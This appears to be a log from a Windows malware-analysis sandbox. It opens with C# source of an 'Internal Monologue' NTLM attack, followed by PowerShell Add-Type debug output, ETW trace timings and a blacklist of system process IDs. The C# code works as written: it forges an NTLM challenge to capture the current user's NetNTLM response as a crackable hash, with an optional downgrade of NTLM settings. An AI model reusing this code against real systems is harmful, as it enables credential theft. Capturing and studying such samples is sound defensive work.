                    if (verbose == true) Console.WriteLine("Performing attack on current user only (no 
impersonation)");
                    Console.WriteLine(InternalMonologueForCurrentUser(challenge));
                }

                if (downgrade == true && restore == true)
                {
                    if (verbose == true) Console.WriteLine("Restoring NTLM values");
                    //Undo changes made in the Extended NetNTLM Downgrade
                    NTLMRestore(oldValue_LMCompatibilityLevel, oldValue_NtlmMinClientSec, 
oldValue_RestrictSendingNTLMTraffic);
                }
            }
            else
            {
                //If the process is not elevated, skip downgrade and impersonation and only perform an Internal 
Monologue Attack for the current user
                if (verbose == true) Console.WriteLine("Not elevated. Performing attack with current NTLM settings on 
current user");
                Console.WriteLine(InternalMonologueForCurrentUser(challenge));
            }           
        }

        //This function performs an Internal Monologue Attack in the context of the current user and returns the 
NetNTLM response for the challenge 0x1122334455667788
        private static string InternalMonologueForCurrentUser(string challenge)
        {
            SecBufferDesc ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);

            SECURITY_HANDLE _hOutboundCred;
                _hOutboundCred.LowPart = _hOutboundCred.HighPart = IntPtr.Zero;
            SECURITY_INTEGER ClientLifeTime;
                ClientLifeTime.LowPart = 0;
                ClientLifeTime.HighPart = 0;
            SECURITY_HANDLE _hClientContext;
            uint ContextAttributes = 0;

            // Acquire credentials handle for current user
            AcquireCredentialsHandle(
                WindowsIdentity.GetCurrent().Name,
                "NTLM",
                2,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                ref _hOutboundCred,
                ref ClientLifeTime
                );

            // Get a type-1 message from NTLM SSP
            InitializeSecurityContext(
                ref _hOutboundCred,
                IntPtr.Zero,
                WindowsIdentity.GetCurrent().Name,
                0x00000800,
                0,
                0x10,
                IntPtr.Zero,
                0,
                out _hClientContext,
                out ClientToken,
                out ContextAttributes,
                out ClientLifeTime
                );
            ClientToken.Dispose();

            ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);

            // Custom made type-2 message with the specified challenge
            byte[] challengeBytes = StringToByteArray(challenge);
            SecBufferDesc ServerToken = new SecBufferDesc(new byte[] { 78, 84, 76, 77, 83, 83, 80, 0, 2, 0, 0, 0, 0, 0,
 0, 0, 40, 0, 0, 0, 1, 0x82, 0, 0, challengeBytes[0], challengeBytes[1], challengeBytes[2], challengeBytes[3], 
challengeBytes[4], challengeBytes[5], challengeBytes[6], challengeBytes[7], 0, 0, 0, 0, 0, 0, 0 });
            InitializeSecurityContext(
                ref _hOutboundCred,
                ref _hClientContext,
                WindowsIdentity.GetCurrent().Name,
                0x00000800,
                0,
                0x10,
                ref ServerToken,
                0,
                out _hClientContext,
                out ClientToken,
                out ContextAttributes,
                out ClientLifeTime
                );
            byte[] result = ClientToken.GetSecBufferByteArray();

            ClientToken.Dispose();
            ServerToken.Dispose();

            //Extract the NetNTLM response from a type-3 message and return it
            return ParseNTResponse(result, challenge);
        }

        //This function parses the NetNTLM response from a type-3 message
        private static string ParseNTResponse(byte[] message, string challenge)
        {
            ushort lm_resp_len = BitConverter.ToUInt16(message, 12);
            uint lm_resp_off = BitConverter.ToUInt32(message, 16);
            ushort nt_resp_len = BitConverter.ToUInt16(message, 20);
            uint nt_resp_off = BitConverter.ToUInt32(message, 24);
            ushort domain_len = BitConverter.ToUInt16(message, 28);
            uint domain_off = BitConverter.ToUInt32(message, 32);
            ushort user_len = BitConverter.ToUInt16(message, 36);
            uint user_off = BitConverter.ToUInt32(message, 40);
            byte[] lm_resp = new byte[lm_resp_len];
            byte[] nt_resp = new byte[nt_resp_len];
            byte[] domain = new byte[domain_len];
            byte[] user = new byte[user_len];
            Array.Copy(message, lm_resp_off, lm_resp, 0, lm_resp_len);
            Array.Copy(message, nt_resp_off, nt_resp, 0, nt_resp_len);
            Array.Copy(message, domain_off, domain, 0, domain_len);
            Array.Copy(message, user_off, user, 0, user_len);

            string result = null;
            if (nt_resp_len == 24)
            {
                result = ConvertHex(ByteArrayToString(user)) + "::" + ConvertHex(ByteArrayToString(domain)) + ":" + 
ByteArrayToString(lm_resp) + ":" + ByteArrayToString(nt_resp) + ":" + challenge;
            }
            else if (nt_resp_len > 24)
            {
                result = ConvertHex(ByteArrayToString(user)) + "::" + ConvertHex(ByteArrayToString(domain)) + ":" + 
challenge + ":" + ByteArrayToString(nt_resp).Substring(0,32) + ":" + ByteArrayToString(nt_resp).Substring(32);
            }
            
            return result;
        }

        //The following function is taken from 
https://stackoverflow.com/questions/311165/how-do-you-convert-a-byte-array-to-a-hexadecimal-string-and-vice-versa
        private static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

        //This function is taken from 
https://stackoverflow.com/questions/3600322/check-if-the-current-user-is-administrator
        private static bool IsElevated()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator);
        }

        //This function is taken from 
https://stackoverflow.com/questions/321370/how-can-i-convert-a-hex-string-to-a-byte-array
        public static byte[] StringToByteArray(string hex)
        {
            if (hex.Length % 2 == 1)
                return null;

            byte[] arr = new byte[hex.Length >> 1];

            for (int i = 0; i < hex.Length >> 1; ++i)
            {
                arr[i] = (byte)((GetHexVal(hex[i << 1]) << 4) + (GetHexVal(hex[(i << 1) + 1])));
            }

            return arr;
        }

        //This function is taken from 
https://stackoverflow.com/questions/321370/how-can-i-convert-a-hex-string-to-a-byte-array
        public static int GetHexVal(char hex)
        {
            int val = (int)hex;
            return val - (val < 58 ? 48 : 55);
        }

        //This function is taken from https://stackoverflow.com/questions/5613279/c-sharp-hex-to-ascii
        public static string ConvertHex(String hexString)
        {
            string ascii = string.Empty;

            for (int i = 0; i < hexString.Length; i += 2)
            {
                String hs = string.Empty;

                hs = hexString.Substring(i, 2);
                if (hs == "00")
                    continue;
                uint decval = System.Convert.ToUInt32(hs, 16);
                char character = System.Convert.ToChar(decval);
                ascii += character;

            }

            return ascii;         
        }
    }

    struct SecBuffer : IDisposable
    {
        public int cbBuffer;
        public int BufferType;
        public IntPtr pvBuffer;

        public SecBuffer(int bufferSize)
        {
            cbBuffer = bufferSize;
            BufferType = 2;
            pvBuffer = Marshal.AllocHGlobal(bufferSize);
        }

        public SecBuffer(byte[] secBufferBytes)
        {
            cbBuffer = secBufferBytes.Length;
            BufferType = 2;
            pvBuffer = Marshal.AllocHGlobal(cbBuffer);
            Marshal.Copy(secBufferBytes, 0, pvBuffer, cbBuffer);
        }

        public SecBuffer(byte[] secBufferBytes, int bufferType)
        {
            cbBuffer = secBufferBytes.Length;
            BufferType = (int)bufferType;
            pvBuffer = Marshal.AllocHGlobal(cbBuffer);
            Marshal.Copy(secBufferBytes, 0, pvBuffer, cbBuffer);
        }

        public void Dispose()
        {
            if (pvBuffer != IntPtr.Zero)
            {
                Marshal.FreeHGlobal(pvBuffer);
                pvBuffer = IntPtr.Zero;
            }
        }
    }

    struct SecBufferDesc : IDisposable
    {
        public int ulVersion;
        public int cBuffers;
        public IntPtr pBuffers;

        public SecBufferDesc(int bufferSize)
        {
            ulVersion = 0;
            cBuffers = 1;
            SecBuffer ThisSecBuffer = new SecBuffer(bufferSize);
            pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(ThisSecBuffer));
            Marshal.StructureToPtr(ThisSecBuffer, pBuffers, false);
        }

        public SecBufferDesc(byte[] secBufferBytes)
        {
            ulVersion = 0;
            cBuffers = 1;
            SecBuffer ThisSecBuffer = new SecBuffer(secBufferBytes);
            pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(ThisSecBuffer));
            Marshal.StructureToPtr(ThisSecBuffer, pBuffers, false);
        }

        public void Dispose()
        {
            if (pBuffers != IntPtr.Zero)
            {
                if (cBuffers == 1)
                {
                    SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer));
                    ThisSecBuffer.Dispose();
                }
                else
                {
                    for (int Index = 0; Index < cBuffers; Index++)
                    {
                        int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                        IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset + 
Marshal.SizeOf(typeof(int)) + Marshal.SizeOf(typeof(int)));
                        Marshal.FreeHGlobal(SecBufferpvBuffer);
                    }
                }

                Marshal.FreeHGlobal(pBuffers);
                pBuffers = IntPtr.Zero;
            }
        }

        public byte[] GetSecBufferByteArray()
        {
            byte[] Buffer = null;

            if (pBuffers == IntPtr.Zero)
            {
                throw new InvalidOperationException("Object has already been disposed!!!");
            }

            if (cBuffers == 1)
            {
                SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer));

                if (ThisSecBuffer.cbBuffer > 0)
                {
                    Buffer = new byte[ThisSecBuffer.cbBuffer];
                    Marshal.Copy(ThisSecBuffer.pvBuffer, Buffer, 0, ThisSecBuffer.cbBuffer);
                }
            }
            else
            {
                int BytesToAllocate = 0;

                for (int Index = 0; Index < cBuffers; Index++)
                {
                    //calculate the total number of bytes we need to copy...
                    int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                    BytesToAllocate += Marshal.ReadInt32(pBuffers, CurrentOffset);
                }

                Buffer = new byte[BytesToAllocate];

                for (int Index = 0, BufferIndex = 0; Index < cBuffers; Index++)
                {
                    //Now iterate over the individual buffers and put them together into a byte array...
                    int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                    int BytesToCopy = Marshal.ReadInt32(pBuffers, CurrentOffset);
                    IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset + Marshal.SizeOf(typeof(int))
 + Marshal.SizeOf(typeof(int)));
                    Marshal.Copy(SecBufferpvBuffer, Buffer, BufferIndex, BytesToCopy);
                    BufferIndex += BytesToCopy;
                }
            }

            return (Buffer);
        }
    }

    struct SECURITY_INTEGER
    {
        public uint LowPart;
        public int HighPart;
    };

    struct SECURITY_HANDLE
    {
        public IntPtr LowPart;
        public IntPtr HighPart;

    };

    struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    enum SECURITY_IMPERSONATION_LEVEL
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }
}
] to param [TypeDefinition] SUCCESSFUL
DEBUG: ParameterBinding Information: 0 :     BIND arg [CSharp] to parameter [Language]
DEBUG: ParameterBinding Information: 0 :         COERCE arg to [Microsoft.PowerShell.Commands.Language]
DEBUG: ParameterBinding Information: 0 :             Trying to convert argument value from System.String to 
Microsoft.PowerShell.Commands.Language
DEBUG: ParameterBinding Information: 0 :             CONVERT arg type to param type using LanguagePrimitives.ConvertTo
DEBUG: ParameterBinding Information: 0 :             CONVERT SUCCESSFUL using LanguagePrimitives.ConvertTo: [CSharp]
DEBUG: ParameterBinding Information: 0 :         BIND arg [CSharp] to param [Language] SUCCESSFUL
DEBUG: ParameterBinding Information: 0 :     BIND arg [System.CodeDom.Compiler.CompilerParameters] to parameter 
[CompilerParameters]
DEBUG: ParameterBinding Information: 0 :         COERCE arg to [System.CodeDom.Compiler.CompilerParameters]
DEBUG: ParameterBinding Information: 0 :             Trying to convert argument value from 
System.Management.Automation.PSObject to System.CodeDom.Compiler.CompilerParameters
DEBUG: ParameterBinding Information: 0 :             CONVERT arg type to param type using LanguagePrimitives.ConvertTo
DEBUG: ParameterBinding Information: 0 :             CONVERT SUCCESSFUL using LanguagePrimitives.ConvertTo: 
[System.CodeDom.Compiler.CompilerParameters]
DEBUG: ParameterBinding Information: 0 :         BIND arg [System.CodeDom.Compiler.CompilerParameters] to param 
[CompilerParameters] SUCCESSFUL
DEBUG: ParameterBinding Information: 0 : BIND POSITIONAL cmd line args [Add-Type]
DEBUG: ParameterBinding Information: 0 : MANDATORY PARAMETER CHECK on cmdlet [Add-Type]
DEBUG: ParameterBinding Information: 0 : CALLING BeginProcessing
DEBUG: ParameterBinding Information: 0 : CALLING EndProcessing

*SUSPENDED the spawned-powershell-process 8756 due to: 'DEBUG: ParameterBinding Information: 0 : CALLING EndProcessing
'

sleep now : for 300 seconds
wake up now : as 300 seconds past

Finished All Close-Traces-- Elapsed-Time: 0:00:00.015702

Started joinit for FILE
Finished joinit for FILE -- Elapsed-Time: 0:00:47.234495
Started joinit for REGISTRY
Finished joinit for REGISTRY -- Elapsed-Time: 0:00:00
Started joinit for NETWORK
Finished joinit for NETWORK -- Elapsed-Time: 0:00:00
Started joinit for PROCESS
Finished joinit for PROCESS -- Elapsed-Time: 0:00:00

Finished starting job1,job2,job3,job4 -- Elapsed-Time: 0:00:00

====================================================================================================
added pid 0 of                                                background-process System Idle Process                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4 of                                                background-process System                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 92 of                                                background-process Registry                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 328 of                                                background-process smss.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 440 of                                                background-process csrss.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 448 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 516 of                                                background-process wininit.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 552 of                                                background-process csrss.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 612 of                                                background-process winlogon.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 628 of                                                background-process services.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 668 of                                                background-process lsass.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 768 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 896 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 940 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1040 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1132 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1188 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1320 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1512 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1524 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1588 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1608 of                                                background-process MemCompression                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1620 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1700 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1796 of                                                background-process taskhostw.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 1832 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2012 of                                                background-process MsMpEng.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2084 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2228 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2296 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2420 of                                                background-process spoolsv.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2500 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2668 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2676 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2724 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2772 of                                                background-process sshd.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2796 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 2856 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 3136 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 3172 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4188 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4320 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4620 of                                                background-process SecurityHealthService.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4628 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4752 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4868 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 4996 of                                                background-process SearchFilterHost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 5220 of                                                background-process SearchIndexer.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 5820 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 7068 of                                                background-process SearchProtocolHost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 7340 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 7544 of                                                background-process TrustedInstaller.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 7744 of                                                background-process TiWorker.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 7788 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 8216 of                                                background-process SgrmBroker.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 8840 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 9036 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 9116 of                                                background-process svchost.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 9132 of                                                background-process uhssvc.exe                                                with username NT AUTHORITY\SYSTEM to pid-blacklist.
added pid 580 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 680 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1048 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1228 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1240 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1336 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1504 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1628 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1676 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1736 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1820 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1868 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1976 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 1984 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2092 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2248 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2596 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2604 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2744 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2764 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 2964 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 3292 of                                                background-process dasHost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 3376 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 3500 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 5044 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 5084 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 5804 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 6876 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 7020 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 9172 of                                                background-process svchost.exe                                                with username NT AUTHORITY\LOCAL SERVICE to pid-blacklist.
added pid 888 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 1560 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 1936 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 1968 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 2588 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 2660 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
added pid 3744 of                                                background-process svchost.exe                                                with username NT AUTHORITY\NETWORK SERVICE to pid-blacklist.
====================================================================================================

Finished Blacklisting Main-Python-Process 2408


*RESUMED the spwaned-powershell-process 8756

PS C:\malware> spawned_psh_process -- Ended before 1 hr ; with NO exception raised
Closing Last ETW-Session-Set

Finished All Close-Traces-- Elapsed-Time: 0:00:00

Started joinit for FILE
Finished joinit for FILE -- Elapsed-Time: 0:00:00.093667
Started joinit for REGISTRY
Finished joinit for REGISTRY -- Elapsed-Time: 0:00:05.765699
Started joinit for NETWORK
Finished joinit for NETWORK -- Elapsed-Time: 0:00:00
Started joinit for PROCESS
Finished joinit for PROCESS -- Elapsed-Time: 0:00:00
